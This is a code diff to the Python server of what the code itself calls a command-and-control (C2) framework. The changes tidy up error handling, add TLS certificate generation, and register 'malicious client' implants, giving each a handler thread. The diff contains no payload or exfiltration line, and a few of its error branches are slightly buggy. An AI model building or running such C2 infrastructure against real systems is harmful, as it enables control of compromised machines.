@@ -1,18 +1,18 @@
 #!/bin/python3
-
 try:
     import subprocess as sp
     import socket
     import threading
-    import time
+    #import time
     import os
+    #import sys
     import random
     import atexit
     from datetime import datetime, timezone
-    import select
+    #import select
     import logging
     import argparse
-    import json
+    #import json
     import math
     import threading
     import traceback
@@ -29,6 +29,9 @@ try:
     from ClientEngine.AuthenticationHandler import Authentication
     from Comms.CommsHandler import send_msg, receive_msg
     from Utils.UtilsHandler import str_encode, bytes_decode
+    # redundant yes, but here while I move to imports, insteead of from imports. it's cleaner/more readable IMO
+    import Utils.UtilsHandler
+    import Utils.KeyGen
 
 except Exception as e:
     print(f"[server.py] Import Error: {e}")
@@ -44,12 +47,18 @@ parser.add_argument('--ip', help="The IP to listen on (0.0.0.0 is a good default
 parser.add_argument('--port', help="The port to listen on", required=True)
 parser.add_argument('--quiet', help="No output to console", action='store_true')
 parser.add_argument('--fileserverport', help="what port for the file server", default=80)
+parser.add_argument('-c', '--generatekeys', help="ReGen Certs & Keys", action="store_true")
+
 
 args = parser.parse_args()
 ip = args.ip
 port = int(args.port)
 quiet = args.quiet
 fileserverport = args.fileserverport
+generate_keys = args.generatekeys
+
+sys_path = os.path.dirname(os.path.realpath(__file__))
+#print(sys_path)
 
 """
 Here's the global Debug + Logging settings. 
@@ -169,12 +178,19 @@ class ServerSockHandler:
     def connection_handler(self):
         """The loop that handles the conections, and passes them off to respective threads/classes
             
-        It's a bit messy
+        Some notes:
+            - This is meant to be run as an infinite listen loop, handling each initial connection before passing it off to its respective threads. If an except is triggered in any function, that
+                must return false, as that tells the loop to continue to the next iteration/listening state. There are probably better ways to do this, but for now the return  is simple & works well
             
         """
+
+        ## I kinda wanna name this loop, cascade sounds cool
         while True:
         ##== Initial handling of client
             ssl_socket = self.server_ssl_handler()
+
+            if not ssl_socket:
+                continue
 
         ##### MOVE TO INDEPENDENT FILE ####
         ##== Parsing the message sent to the server. 
@@ -206,17 +222,20 @@ class ServerSockHandler:
             
             ## == Decisions based on parsed messages
             if self.action == "!_userlogin_!":
-                self.userloginhandler(
+                ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
+                if not self.userloginhandler(
                     response_from_client=response_from_client,
-                    ssl_conn = ssl_socket
-                )
+                    ssl_conn = ssl_socket):
+                    
+                    continue
              
             ## !_client_! handler
             elif self.action == "!_clientlogin_!":
-                self.clientloginhandler(
+                if not self.clientloginhandler(
                     ssl_conn = ssl_socket,
-                    response_from_client=response_from_client
-                )
+                    response_from_client=response_from_client):
+                    
+                    continue
             
             ## Getting rid of any http traffic that made its way to the c2 server instead of the webserver
             elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
@@ -258,13 +277,17 @@ class ServerSockHandler:
                 - Old SSL or client does not support SSL
                 
             '''
-            logging.warning(f"[Server (connection_handler)] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")
+            logging.warning(f"[Server (server_ssl_handler)] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")
 
         except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
-            logging.warning(f"[Server (connection_handler)] Client {self.client_remote_ip_port} disconnected")
+            logging.warning(f"[Server (server_ssl_handler)] Client {self.client_remote_ip_port} disconnected")
+            return False
+        except FileNotFoundError as fnfe:
+            logging.debug(f"[Server (server_ssl_handler)] Missing a file, either .CRT or .KEY: {type(e)}")
+
         except Exception as e:
-            logging.debug(f"[Server (connection_handler)] Unkown Error: {type(e)}")
-            #return     
+            logging.debug(f"[Server (server_ssl_handler)] Unkown Error: {type(e)}")
+            return False     
   
     def socket_cleanup(self):
         """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
@@ -299,9 +322,11 @@ class ServerSockHandler:
         except ValueError as e:
                     # If there is a value error, set the username and password to None
             logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
+            return False
         except Exception as e:
                     # If there is any other exception, set the username and password to None
             logging.debug(f"Unknown error with logon process: {e}")
+            return  False
 
 
         ## all friendly clients are refered to with !!~ infront of their name (has to do with identifying them in the gloabls function)
@@ -333,8 +358,11 @@ class ServerSockHandler:
 
             except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
                 logging.warning(f"Friendly Client {friendly_client_name} disconnected")
+                return False
+            
             except Exception as e:
                 logging.warning(f"[Friendly Client Error]:{e}")
+                return False
                         
         ## On failed authentication, sending back a 1 & log
         else:
@@ -361,32 +389,38 @@ class ServerSockHandler:
         except ValueError as e:
                     # If there is a value error, set the username and password to None
             logging.debug(f"Value error with login, credentials probably passed wrong: {e}")
-            return
+            return False
         
         except Exception as e:
             # If there is any other exception, set the username and password to None
             logging.debug(f"Unknown error with logon process: {e}")
-            return
+            return False
         
         # construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
         #client_name = "client_" + self.conn.getpeername()[0].replace(".", "_") + "_" + self.id
 
-        #note, ssl_conn.getpeername may not work
-        client_name = "client_" + self.ssl_conn.getpeername()[0].replace(".", "_") + "_" + self.id
-        
-        # If client is not in current clients list, add it
-        if client_name not in self.current_clients:
-            self.current_clients.append(client_name)
+        try:
+            #note, ssl_conn.getpeername may not work
+            client_name = "client_" + self.ssl_conn.getpeername()[0].replace(".", "_") + "_" + self.id
+            
+            # If client is not in current clients list, add it
+            if client_name not in self.current_clients:
+                self.current_clients.append(client_name)
 
-            # Create a new malicious client handler instance and add it to the clients dict
-            self.clients[client_name] = ServerMaliciousClientHandler()
-            globals()[client_name] = self.clients[client_name]
+                # Create a new malicious client handler instance and add it to the clients dict
+                self.clients[client_name] = ServerMaliciousClientHandler()
+                globals()[client_name] = self.clients[client_name]
 
-        # Create a new thread for this client's communication
-        threading.Thread(
-            target=self.clients[client_name].handle_client,
-            args=(ssl_conn, self.response, id)
-            ).start()  
+            # Create a new thread for this client's communication
+            threading.Thread(
+                target=self.clients[client_name].handle_client,
+                args=(ssl_conn, self.response, id)
+                ).start()  
+
+        except Exception as e:
+            logging.debug(f"Server (clientloginhandler)] Unknown Error: {e}")
+            return False
+
 
 
 
@@ -399,6 +433,14 @@ if fileserverport == port:
 
 #Data.json_create()
 try:
+    ## Temp file check, will be put  in a func later
+    Utils.UtilsHandler.file_check(f"{sys_path}/server.crt")
+    
+    if generate_keys:
+        Utils.KeyGen.ssl_gen(
+            save_file_path=sys_path
+        )
+
     s = ServerSockHandler()
     s.start_server(ip, port)
 except KeyboardInterrupt as ke:
